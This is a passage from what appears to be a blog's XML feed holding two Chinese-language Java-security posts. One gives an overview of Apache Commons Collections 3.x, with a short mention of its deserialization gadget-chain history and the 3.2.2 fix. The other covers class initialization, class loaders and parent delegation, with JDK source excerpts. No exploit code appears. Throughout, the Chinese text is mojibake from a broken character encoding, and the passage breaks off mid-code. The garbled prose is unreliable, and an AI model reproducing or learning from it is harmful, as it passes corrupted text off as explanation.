å·¥å…·ç±»</strong>ï¼Œç»™ä¸‹é¢çš„å­åŒ…ï¼ˆbag&#x2F;map&#x2F;iterators&#x2F;functorsâ€¦ï¼‰æä¾›ç»Ÿä¸€æŠ½è±¡ã€‚</p><p>A. å››ä¸ªâ€œå‡½æ•°å¼å›è°ƒâ€æ¥å£ï¼ˆ3.x å¾ˆæ ‡å¿—æ€§ï¼‰</p><p>è¿™äº›æ¥å£åœ¨ 3.x é‡Œéå¸¸å¸¸è§ï¼Œç”¨æ¥æŠŠâ€œé€»è¾‘â€å½“å¯¹è±¡ä¼ æ¥ä¼ å»ï¼š</p><ul><li><strong>Predicate</strong>ï¼š<code>boolean evaluate(Object)</code>ï¼ˆè¿‡æ»¤ç”¨ï¼‰</li><li><strong>Transformer</strong>ï¼š<code>Object transform(Object)</code>ï¼ˆæŠŠ A å˜ Bï¼‰</li><li><strong>Closure</strong>ï¼š<code>void execute(Object)</code>ï¼ˆå¯¹å…ƒç´ åšåŠ¨ä½œï¼‰</li><li><strong>Factory</strong>ï¼š<code>Object create()</code>ï¼ˆå»¶è¿Ÿåˆ›å»ºå¯¹è±¡ï¼‰</li></ul><p>è¿™äº›å®ç°å¤§é‡é›†ä¸­åœ¨ <code>functors</code> åŒ…ã€‚</p><p>B. å¸¸ç”¨å·¥å…·ç±»</p><ul><li><code>CollectionUtils</code>ï¼šé›†åˆå¹¶&#x2F;äº¤&#x2F;å·®ã€åˆ¤ç©ºã€è®¡æ•°ç­‰ï¼ˆæ¯”å¦‚â€œç»Ÿè®¡æ¯ä¸ªå…ƒç´ å‡ºç°æ¬¡æ•°â€ï¼‰ã€‚</li><li><code>MapUtils</code>ã€<code>SetUtils</code>ã€<code>ListUtils</code>ã€<code>IteratorUtils</code>ï¼šå„ç§â€œè¡¥ JDK ç¼ºå£â€çš„å°å·¥å…·ï¼ˆ4.x&#x2F;3.x éƒ½æœ‰ç±»ä¼¼æ€æƒ³ï¼Œåå­—ä¹Ÿå¾ˆåƒï¼‰ã€‚</li></ul><hr><h3 id="3-åˆ†å·¥"><a href="#3-åˆ†å·¥" class="headerlink" title="3.åˆ†å·¥"></a>3.åˆ†å·¥</h3><p>ï¼ˆ1ï¼‰<code>functors</code>ï¼šå›è°ƒ&#x2F;å‡½æ•°å¯¹è±¡å®ç°</p><p>æä¾› Predicate&#x2F;Transformer&#x2F;Closure&#x2F;Factory çš„ä¸€å †ç°æˆå®ç°ï¼Œæ¯”å¦‚â€œé“¾å¼ transformerâ€ã€â€œswitch transformerâ€ç­‰ã€‚ </p><p>ï¼ˆ2ï¼‰<code>bag</code>ï¼šBag&#x2F;Multisetï¼ˆâ€œå¸¦è®¡æ•°çš„é›†åˆâ€ï¼‰</p><p>åƒ Python çš„ <code>Counter</code>ï¼šåŒä¸€ä¸ªå…ƒç´ å¯ä»¥å‡ºç°å¤šæ¬¡ï¼Œå¹¶èƒ½ç›´æ¥æ‹¿åˆ°å‡ºç°æ¬¡æ•°ã€‚åŒ…å†…æœ‰ <code>HashBag</code>ã€<code>TreeBag</code> ç­‰ã€‚ [</p><p>ï¼ˆ3ï¼‰<code>bidimap</code>ï¼šBidiMapï¼ˆåŒå‘ Mapï¼‰</p><p>æ—¢èƒ½ <code>key -&gt; value</code>ï¼Œä¹Ÿèƒ½ <code>value -&gt; key</code> åæŸ¥ï¼ˆå€¼ä¹Ÿè¦æ±‚èƒ½å”¯ä¸€æ˜ å°„ï¼‰ã€‚æœ‰ <code>DualHashBidiMap</code>ã€<code>TreeBidiMap</code> ç­‰ã€‚</p><p>ï¼ˆ4ï¼‰<code>buffer</code>ï¼šBuffer &#x2F; FIFO &#x2F; PriorityBuffer</p><p>æä¾›ä¸€äº›é˜Ÿåˆ—&#x2F;ç¼“å†²ç›¸å…³ç»“æ„ï¼Œæ¯”å¦‚ <code>UnboundedFifoBuffer</code>ã€<code>CircularFifoBuffer</code> ç­‰ã€‚</p><p>ï¼ˆ5ï¼‰<code>collection</code> &#x2F; <code>map</code> &#x2F; <code>list</code> &#x2F; <code>set</code> ç­‰ï¼šè£…é¥°å™¨ï¼ˆDecoratorï¼‰å®¶æ—</p><p>è¿™ä¸€ç±»éå¸¸å¤šï¼Œå…¸å‹æ€è·¯æ˜¯**â€œåŒ…è£…ä¸€ä¸ªç°æœ‰é›†åˆï¼Œå¹¶åœ¨ add&#x2F;put æ—¶åšé¢å¤–çº¦æŸâ€**ï¼š</p><ul><li><strong>PredicatedXxx</strong>ï¼šåªå…è®¸æ»¡è¶³ Predicate çš„å…ƒç´ è¿›å…¥</li><li><strong>TransformedXxx</strong>ï¼šæ”¾è¿›å»å‰å…ˆåš transform</li><li><strong>TypedXxx</strong>ï¼šè¿è¡ŒæœŸåšç±»å‹æ£€æŸ¥ï¼ˆåœ¨æ²¡æ³›å‹çš„å¹´ä»£å¾ˆæœ‰ç”¨ï¼‰</li><li><strong>SynchronizedXxx</strong> &#x2F; <strong>UnmodifiableXxx</strong>ï¼šåŠ é”&#x2F;åªè¯»åŒ…è£…</li></ul><h3 id="å®‰å…¨æ–¹å‘çš„-commons-collections"><a href="#å®‰å…¨æ–¹å‘çš„-commons-collections" class="headerlink" title="å®‰å…¨æ–¹å‘çš„ commons-collections"></a>å®‰å…¨æ–¹å‘çš„ commons-collections</h3><p><strong>åº“æœ¬èº«ä¸æ˜¯â€œä¼šè‡ªåŠ¨ RCEâ€</strong>ï¼Œé—®é¢˜å‡ºåœ¨â€œåº”ç”¨æŠŠä¸å¯ä¿¡æ•°æ®åš Java ååºåˆ—åŒ–ï¼ˆ<code>ObjectInputStream.readObject()</code>ï¼‰â€ã€‚ 3.2.1 é‡Œ <code>functors</code> çš„ä¸€äº›å¯åºåˆ—åŒ–ç±»ï¼Œå†å²ä¸Šè¢«æ»¥ç”¨å»æ‹¼â€œgadget chainâ€ï¼Œå¯¼è‡´åœ¨ç‰¹å®šååºåˆ—åŒ–åœºæ™¯ä¸‹è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œé£é™©ï¼ˆè‘—å CVE åœ¨ 2015 å¹´é›†ä¸­çˆ†å‘ï¼‰ã€‚</p><p>Apache åœ¨ <strong>3.2.2</strong> ä¹‹åå¯¹ <code>functors</code> åŒ…é‡Œâ€œè¢«è®¤ä¸ºä¸å®‰å…¨çš„ç±»â€åšäº†å¤„ç†ï¼šåœ¨åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ—¶ç›´æ¥æŠ› <code>UnsupportedOperationException</code> æ¥é™ä½è¢«åˆ©ç”¨çš„é£é™©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½</title>
      <link href="/2026/01/06/dynamicloading/"/>
      <url>/2026/01/06/dynamicloading/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½"><a href="#javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½"></a>javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½</h1><h2 id="ä¸€ã€ä¸åŒç±»åŠ è½½æ–¹æ³•"><a href="#ä¸€ã€ä¸åŒç±»åŠ è½½æ–¹æ³•" class="headerlink" title="ä¸€ã€ä¸åŒç±»åŠ è½½æ–¹æ³•"></a>ä¸€ã€ä¸åŒç±»åŠ è½½æ–¹æ³•</h2><p><strong>åˆ†æä¸åŒç±»åŠ è½½æ–¹æ³•ä¼šå¯¼è‡´ç±»ä¸­ä»£ç å—è¿è¡Œæƒ…å†µ</strong></p><h3 id="javaä¸­ç±»åˆå§‹ä»£ç å—"><a href="#javaä¸­ç±»åˆå§‹ä»£ç å—" class="headerlink" title="javaä¸­ç±»åˆå§‹ä»£ç å—"></a><strong>javaä¸­ç±»åˆå§‹ä»£ç å—</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="comment">// é™æ€å­—æ®µåˆå§‹åŒ–ï¼ˆç±»åˆå§‹åŒ–é˜¶æ®µï¼ŒæŒ‰æºç é¡ºåºï¼‰</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PS</span> <span class="operator">=</span> init(<span class="string">&quot;Parent static field PS&quot;</span>);</span><br><span class="line">    <span class="comment">// é™æ€ä»£ç å—ï¼ˆç±»åˆå§‹åŒ–é˜¶æ®µï¼ŒæŒ‰æºç é¡ºåºï¼‰</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;Parent static&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ™®é€šå­—æ®µåˆå§‹åŒ–ï¼ˆå¯¹è±¡åˆå§‹åŒ–é˜¶æ®µï¼ŒæŒ‰æºç é¡ºåºï¼‰</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">pi</span> <span class="operator">=</span> init(<span class="string">&quot;Parent instance field pi&quot;</span>);</span><br><span class="line">    <span class="comment">// å®ä¾‹åˆå§‹åŒ–å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        log(<span class="string">&quot;Parent instance&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Parent</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;Parent constructor()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;Parent staticMethod()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-ä¸€å®šè§¦å‘-static-çš„"><a href="#1-ä¸€å®šè§¦å‘-static-çš„" class="headerlink" title="1.ä¸€å®šè§¦å‘ static{} çš„"></a>1.ä¸€å®šè§¦å‘ <code>static{}</code> çš„</h3><p>A. <code>new Person()</code></p><p>â€œåˆ›å»ºå®ä¾‹â€æ˜¯ JLS 12.4.1 çš„ç¬¬ä¸€æ¡è§¦å‘æ¡ä»¶ï¼Œæ‰€ä»¥åœ¨çœŸæ­£åˆ›å»ºå¯¹è±¡ä¹‹å‰å¿…é¡»åˆå§‹åŒ–ã€‚</p><p>B. <code>Person.staticAction()</code></p><p>è°ƒç”¨é™æ€æ–¹æ³•æ˜¯ç¬¬äºŒæ¡è§¦å‘æ¡ä»¶ã€‚ </p><p>C. <code>Person.staticVar = 1</code></p><p>ç»™é™æ€å­—æ®µèµ‹å€¼æ˜¯ç¬¬ä¸‰æ¡è§¦å‘æ¡ä»¶ã€‚ </p><p>D. <code>System.out.println(Person.staticVar)</code>ï¼ˆä¸”ä¸æ˜¯ç¼–è¯‘æœŸå¸¸é‡ï¼‰</p><p>è¯»å–é™æ€å­—æ®µæ˜¯ç¬¬å››æ¡è§¦å‘æ¡ä»¶ï¼Œä½†<strong>å¿…é¡»â€œä¸æ˜¯ constant variableâ€</strong>ã€‚</p><p>E. <code>Class.forName(&quot;Person&quot;)</code></p><p>JDK æ–‡æ¡£å†™å¾—éå¸¸ç›´ç™½ï¼š<code>forName(&quot;X&quot;)</code> <strong>ä¼šå¯¼è‡´ç±» X è¢«åˆå§‹åŒ–</strong>ã€‚ </p><h3 id="2-ä¸è§¦å‘-static-çš„"><a href="#2-ä¸è§¦å‘-static-çš„" class="headerlink" title="2.ä¸è§¦å‘ static{} çš„"></a>2.ä¸è§¦å‘ <code>static{}</code> çš„</h3><h4 id="A-Person-class"><a href="#A-Person-class" class="headerlink" title="A. Person.class"></a>A. <code>Person.class</code></h4><p><code>Person.class</code> æ˜¯ä¸€ä¸ª <strong>class literalï¼ˆç±»å­—é¢é‡ï¼‰è¡¨è¾¾å¼</strong>ï¼Œè§„èŒƒåªä¿è¯å®ƒâ€œæ±‚å€¼ç»“æœæ˜¯å¯¹åº”çš„ <code>Class</code> å¯¹è±¡â€ã€‚</p><ul><li>å®ƒ<strong>ä¸å±äº</strong> JLS 12.4.1 åˆ—å‡ºçš„å››ç§åˆå§‹åŒ–è§¦å‘äº‹ä»¶</li><li>è€Œ JLS 12.4.1 åˆæ˜ç¡®è¯´â€œä¸ä¼šå› ä¸ºå…¶ä»–æƒ…å†µåˆå§‹åŒ–â€</li></ul><blockquote><p><code>Person.class</code> <strong>å¯èƒ½ä¼šä¸ºäº†å¾—åˆ° <code>Class</code> å¯¹è±¡è€Œå‘ç”Ÿâ€œåŠ è½½&#x2F;é“¾æ¥â€</strong>ï¼Œä½†å®ƒ<strong>ä¸ä¼šè§¦å‘åˆå§‹åŒ–</strong>ï¼Œå› æ­¤ <code>static{}</code> ä¸è·‘ã€ä¸ä¼šæ‰“å°ã€‚</p></blockquote><h4 id="B-ClassLoader-loadClass-Person"><a href="#B-ClassLoader-loadClass-Person" class="headerlink" title="B. ClassLoader.loadClass(&quot;Person&quot;)"></a>B. <code>ClassLoader.loadClass(&quot;Person&quot;)</code></h4><p>Oracle çš„ <code>ClassLoader.loadClass(name)</code> æ–‡æ¡£è¯´å®ƒç­‰ä»·äº <code>loadClass(name, false)</code>ã€‚<br> è€Œ <code>loadClass(name, boolean resolve)</code> çš„ <code>resolve</code> ä¹Ÿåªæ˜¯â€œæ˜¯å¦ resolveï¼ˆé“¾æ¥çš„ä¸€éƒ¨åˆ†ï¼‰â€ã€‚ </p><blockquote><p><strong>æŠŠç±»å¼„æˆ JVM å·²çŸ¥ï¼ˆLoadedï¼Œå¯èƒ½è¿˜ resolveï¼‰ï¼Œä½†ä¸åšåˆå§‹åŒ–</strong> â‡’ <code>static{}</code> ä¸è·‘ã€‚</p></blockquote><hr><h4 id="C-Class-forName-name-false-loader"><a href="#C-Class-forName-name-false-loader" class="headerlink" title="C. Class.forName(name, false, loader)"></a>C. <code>Class.forName(name, false, loader)</code></h4><p><code>Class.forName(name, initialize, loader)</code> æ–‡æ¡£å†™äº†ï¼šåªæœ‰å½“ <code>initialize</code> ä¸º <code>true</code> æ‰ä¼šåˆå§‹åŒ–ã€‚<br> æ‰€ä»¥ <code>false</code> å°±æ˜¯ï¼šæ‹¿åˆ° <code>Class</code>ï¼Œä½†ä¸è·‘ <code>static{}</code>ã€‚</p><h2 id="äºŒã€ç±»åŠ è½½å™¨"><a href="#äºŒã€ç±»åŠ è½½å™¨" class="headerlink" title="äºŒã€ç±»åŠ è½½å™¨"></a>äºŒã€ç±»åŠ è½½å™¨</h2><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051643863.png" alt="image-20260105164334723" style="zoom:80%;" /><h3 id="1-å¯åŠ¨ç±»åŠ è½½å™¨"><a href="#1-å¯åŠ¨ç±»åŠ è½½å™¨" class="headerlink" title="1.å¯åŠ¨ç±»åŠ è½½å™¨"></a>1.å¯åŠ¨ç±»åŠ è½½å™¨</h3><ul><li><strong>Bootstrap</strong></li></ul><p>ä¸»è¦åŠ è½½ï¼š</p><ul><li><code>rt.jar</code>ï¼ˆæ ¸å¿ƒç±»åº“ï¼š<code>java.lang.*</code>ã€<code>java.util.*</code> ç­‰ï¼‰</li><li><code>resources.jar</code>ã€<code>charsets.jar</code> ç­‰</li></ul><p>æœç´¢è·¯å¾„ï¼ˆå¯é€šè¿‡ç³»ç»Ÿå±æ€§æŸ¥çœ‹ï¼‰ï¼š</p><ul><li><code>sun.boot.class.path</code></li></ul><p>Bootstrap æ°¸è¿œè´Ÿè´£ â€œè®© JVM æœ‰èƒ½åŠ›è·‘èµ·æ¥çš„æœ€åŸºç¡€é‚£æ‰¹ç±»â€ï¼Œä»–æ˜¯æœ€åŸºç¡€çš„ç±»åŠ è½½å™¨</p><p>åŒæ—¶ï¼Œå®ƒä¸æ˜¯ä¸€ä¸ªæ™®é€šçš„ <code>java.lang.ClassLoader</code> å¯¹è±¡ï¼Œå¾ˆå¤šåœ°æ–¹ç”¨ <code>null</code> è¡¨ç¤ºï¼Œè¿™æ˜¯å› ä¸ºä»–æ˜¯ç”±Cè¯­è¨€å®ç°çš„</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051653046.png" alt="image-20260105165311899"></p><h3 id="2-javaä¸­å®ç°çš„ç±»åŠ è½½å™¨"><a href="#2-javaä¸­å®ç°çš„ç±»åŠ è½½å™¨" class="headerlink" title="2.javaä¸­å®ç°çš„ç±»åŠ è½½å™¨"></a>2.javaä¸­å®ç°çš„ç±»åŠ è½½å™¨</h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051654836.png" alt="image-20260105165434761"></p><p><strong>ä»–ä»¬éƒ½æ˜¯ç»§æ‰¿äºURLClassLoaderç±»</strong></p><h4 id="Extensionç±»åŠ è½½å™¨"><a href="#Extensionç±»åŠ è½½å™¨" class="headerlink" title="Extensionç±»åŠ è½½å™¨"></a><strong>Extensionç±»åŠ è½½å™¨</strong></h4><p>å®ƒä¸»è¦ä»<strong>æ‰©å±•ç›®å½•</strong>åŠ è½½ JARï¼ˆä»¥åŠç›®å½•é‡Œçš„ classï¼‰ï¼Œæ¥æºæœ‰ä¸¤å—ï¼š</p><p><strong>A. é»˜è®¤æ‰©å±•ç›®å½•ï¼š<code>${java.home}/lib/ext</code></strong></p><p>JDK 8 çš„ç»å…¸ç›®å½•å°±æ˜¯ï¼š</p><ul><li><code>$JAVA_HOME/jre/lib/ext</code>ï¼ˆæˆ– <code>java.home/lib/ext</code>ï¼‰</li></ul><p>æŠŠä¸€ä¸ª <code>xxx.jar</code> æ”¾è¿›è¿™ä¸ªç›®å½•åï¼ˆJDK8ï¼‰ï¼ŒExtClassLoader ä¼šæŠŠå®ƒå½“â€œæ‰©å±•åº“â€åŠ è½½ï¼Œåº”ç”¨ä»£ç ä¸ç”¨é¢å¤–åŠ  <code>-cp</code> ä¹Ÿå¯èƒ½èƒ½ç”¨åˆ°ã€‚</p><p><strong>B. <code>java.ext.dirs</code> ç³»ç»Ÿå±æ€§æŒ‡å®šçš„ç›®å½•åˆ—è¡¨</strong></p><p>ExtClassLoader ä¼šè¯»å–ç³»ç»Ÿå±æ€§ï¼š</p><ul><li><code>java.ext.dirs</code></li></ul><h4 id="Applicationç±»åŠ è½½å™¨"><a href="#Applicationç±»åŠ è½½å™¨" class="headerlink" title="Applicationç±»åŠ è½½å™¨"></a>Applicationç±»åŠ è½½å™¨</h4><p>è¿™ä¸ªä¸»è¦åŠ è½½ä¸‹é¢ä¸‰éƒ¨åˆ†è·¯å¾„ä¸‹çš„å­—èŠ‚ç æ–‡ä»¶</p><ul><li><p><code>target/classes</code>ã€<code>out/production</code> ä¹‹ç±»ç¼–è¯‘äº§ç‰©</p></li><li><p>é¡¹ç›®ä¾èµ–çš„ jarï¼ˆmaven&#x2F;gradle ä¸‹è½½é‚£å †ï¼‰</p></li><li><p>è¿è¡Œå‘½ä»¤é‡Œ <code>-cp/-classpath</code> æŒ‡å®šçš„æ‰€æœ‰ <code>classpath</code> æ¡ç›®</p></li></ul><p><strong>ä»–ä»¬éƒ½æ˜¯sun&#x2F;misc&#x2F;Launcher.javaè¿™ä¸ªç±»ä¸­çš„å­ç±»</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051752603.png" alt="image-20260105175253531"></p><h2 id="ä¸‰ã€å­—èŠ‚ç åŠ è½½æ–¹å¼"><a href="#ä¸‰ã€å­—èŠ‚ç åŠ è½½æ–¹å¼" class="headerlink" title="ä¸‰ã€å­—èŠ‚ç åŠ è½½æ–¹å¼"></a>ä¸‰ã€å­—èŠ‚ç åŠ è½½æ–¹å¼</h2><h3 id="1-åŒäº²å§”æ´¾æ¨¡å‹"><a href="#1-åŒäº²å§”æ´¾æ¨¡å‹" class="headerlink" title="1.åŒäº²å§”æ´¾æ¨¡å‹"></a>1.åŒäº²å§”æ´¾æ¨¡å‹</h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601042241066.png" alt="image-20260104224101015"></p><h4 id="åŒäº²å§”æ´¾ä½œç”¨"><a href="#åŒäº²å§”æ´¾ä½œç”¨" class="headerlink" title="åŒäº²å§”æ´¾ä½œç”¨"></a><strong>åŒäº²å§”æ´¾ä½œç”¨</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051713467.png" alt="image-20260105171319355"></p><h4 id="å…·ä½“çš„åŠ è½½æµç¨‹"><a href="#å…·ä½“çš„åŠ è½½æµç¨‹" class="headerlink" title="å…·ä½“çš„åŠ è½½æµç¨‹"></a><strong>å…·ä½“çš„åŠ è½½æµç¨‹</strong></h4><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051714521.png" alt="image-20260105171445275" style="zoom:67%;" /><p><strong>ä»£ç å®ç°</strong></p><p><strong>java&#x2F;lang&#x2F;ClassLoader.javaä¸­loadClassæ–¹æ³•</strong></p><ul><li><strong>ç±»åŠ è½½æ—¶è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">   </span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;   <span class="number">1.</span><span class="comment">//å¦‚æœä¸ä¸ºç©ºï¼Œä¸‹é¢ä»£ç å…¨éƒ¨ä¸æ‰§è¡Œï¼Œç›´æ¥è¿”å›ç±»å¯¹è±¡</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//è¿™ä¸ªä¹ŸåŒæ—¶æ˜¯åŒäº²å§”æ´¾çš„é‡è¦é€»è¾‘</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);<span class="number">2.</span><span class="comment">//å‘ä¸Šå§”æ´¾åŠŸèƒ½å®ç°</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);<span class="number">3.</span><span class="comment">//å‘ä¸Šå§”æ´¾ç»“æŸã€‚ä¹Ÿå°±æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="number">4.</span><span class="comment">//ç›´åˆ°æœ€é«˜çº§çš„çˆ¶äº²éƒ½æ²¡æœ‰åŠ è½½æˆåŠŸï¼Œæ‰€ä»¥å°±ç”±å½“å‰çš„ç±»åŠ è½½å™¨åŠ è½½</span></span><br><span class="line"> </span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name); <span class="number">5.</span><span class="comment">//è¿›è¡Œç±»åŠ è½½ï¼Œå½“å‰ç±»åªæ˜¯æŠ½è±¡æ–¹æ³•ï¼Œæœ€ç»ˆç”±å­ç±»å®ç°</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;<span class="comment">//è¿™é‡Œï¼Œå¦‚æœçˆ¶ç±»å·²ç»åŠ è½½ï¼Œè¿™é‡Œç›´æ¥è¿”æƒ </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>java&#x2F;net&#x2F;URLClassLoader.javaä¸­ findClass æ–¹æ³•</strong></p><ul><li><strong>å®ƒæ˜¯loadclassçš„å­ç±»ï¼Œå®ƒå®ç°äº†findclassæ–¹æ³•ï¼Œå¹¶ä¸”äº¤äºˆextionä¸applicationç±»åŠ è½½å™¨è¿›è¡Œè°ƒç”¨</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="number">6.</span><span class="comment">//æ ¸å¿ƒé€»è¾‘</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                            <span class="number">7.</span><span class="comment">//æœ€ç»ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line">                            </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ClassFormatError e2) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (res.getDataError() != <span class="literal">null</span>) &#123;</span><br><span class="line">                                e2.addSuppressed(res.getDataError());</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">throw</span> e2;</span><br><span class="line">                        